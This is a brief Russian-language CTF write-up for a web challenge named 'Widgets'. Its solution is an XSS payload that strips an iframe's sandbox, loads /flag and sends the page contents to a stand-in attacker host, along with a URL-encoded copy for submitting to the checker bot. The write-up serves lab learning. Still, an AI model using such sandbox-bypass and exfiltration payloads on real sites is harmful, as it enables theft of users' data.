# Widgets

## Описание:
Что такое эти ваши iframe?

# ЕСТЬ /give !!!!

## Решение:  

Пример js кода, который байпасит sandbox у iframe, вытаскивает флаг и отсылает игроку.  
  
```html
<script>
var ifram = document.getElementById('ifr');
ifram.removeAttribute('sandbox');
ifram.src = '/flag';
setTimeout(()=>{window.location.replace(`http://<ATTACKER_URL>/?a=${ifram.contentWindow.document.body.innerHTML}`)},2000);
</script>
```
    
Пример того, как это скормить чекеру:  
  
```
http://web:8000/widget-test?content=%3Cscript%3Evar%20ifram%20=%20document.getElementById(%27ifr%27);ifram.removeAttribute(%27sandbox%27);ifram.src%20=%20%27/flag%27;setTimeout(()=%3E{window.location.replace(`http://<ATTACKER_URL>/?a=${ifram.contentWindow.document.body.innerHTML}`)},2000);%3C/script%3E
```


